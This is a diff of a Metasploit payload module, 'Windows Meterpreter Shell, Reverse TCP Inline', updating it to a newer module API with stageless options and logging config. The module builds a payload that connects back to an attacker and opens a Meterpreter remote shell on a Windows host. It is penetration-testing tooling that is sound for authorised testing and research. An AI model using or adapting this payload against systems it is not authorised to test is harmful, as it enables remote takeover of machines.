@@ -1,19 +1,12 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-require 'msf/core'
-require 'msf/core/payload/transport_config'
-require 'msf/core/handler/reverse_tcp'
-require 'msf/core/payload/windows/meterpreter_loader'
-require 'msf/base/sessions/meterpreter_x86_win'
-require 'msf/base/sessions/meterpreter_options'
-require 'rex/payloads/meterpreter/config'
 
-module Metasploit3
+module MetasploitModule
 
-  CachedSize = 957999
+  CachedSize = 175686
 
   include Msf::Payload::TransportConfig
   include Msf::Payload::Windows
@@ -25,7 +18,7 @@ module Metasploit3
 
     super(merge_info(info,
       'Name'        => 'Windows Meterpreter Shell, Reverse TCP Inline',
-      'Description' => 'Connect back to attacker and spawn a Meterpreter shell',
+      'Description' => 'Connect back to attacker and spawn a Meterpreter shell. Requires Windows XP SP2 or newer.',
       'Author'      => [ 'OJ Reeves' ],
       'License'     => MSF_LICENSE,
       'Platform'    => 'win',
@@ -37,11 +30,12 @@ module Metasploit3
     register_options([
       OptString.new('EXTENSIONS', [false, 'Comma-separate list of extensions to load']),
       OptString.new('EXTINIT',    [false, 'Initialization strings for extensions']),
-    ], self.class)
+    ])
   end
 
-  def generate
-    stage_meterpreter(true) + generate_config
+  def generate(opts={})
+    opts[:stageless] = true
+    stage_meterpreter(opts) + generate_config(opts)
   end
 
   def generate_config(opts={})
@@ -55,8 +49,9 @@ module Metasploit3
       uuid:       opts[:uuid],
       transports: [transport_config_reverse_tcp(opts)],
       extensions: (datastore['EXTENSIONS'] || '').split(','),
-      ext_init:   (datastore['EXTINIT'] || '')
-    }
+      ext_init:   (datastore['EXTINIT'] || ''),
+      stageless:  true,
+    }.merge(meterpreter_logging_config(opts))
 
     # create the configuration instance based off the parameters
     config = Rex::Payloads::Meterpreter::Config.new(config_opts)
@@ -64,6 +59,5 @@ module Metasploit3
     # return the binary version of it
     config.to_b
   end
-
 end
 
